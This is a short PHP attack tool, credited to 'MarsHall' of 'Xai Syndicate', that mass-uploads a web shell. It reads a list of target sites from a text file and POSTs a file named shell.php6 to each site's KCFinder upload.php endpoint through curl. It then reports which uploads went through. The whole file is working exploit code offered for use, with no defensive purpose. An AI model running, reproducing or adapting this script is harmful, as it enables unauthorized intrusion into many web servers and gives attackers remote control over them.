<?php

    echo "Author : MarsHall\n";
    echo "Team   : Xai Syndicate\n";
    echo "Tools  : Mass Upload Shell KCfinder\n\n";

    $list = file_get_contents("fck.txt");
    $lis = explode("\n", $list);
    
    foreach($lis as $ht){
    
$target = "$ht/kcfinder/upload.php";           
$shell = 'shell.php6';   
$file = new CURLFile(realpath($shell));
$up = array (
        'file' => $file
              );    

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible;)");   
    curl_setopt($ch, CURLOPT_HTTPHEADER,array('Content-Type: multipart/form-data'));
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1);   
    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1);  
    curl_setopt($ch, CURLOPT_TIMEOUT, 100);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $up);

    $result = curl_exec ($ch);

 if ($result === FALSE) {
        echo "Gagal Upload " . $shell .  " " . curl_error($ch);
        curl_close ($ch);
    }else{
        curl_close ($ch);
        echo "################################\n";
        echo "[+] $ht \n\n" . $result;
        echo "\n\n";
    }  
    
    
} 
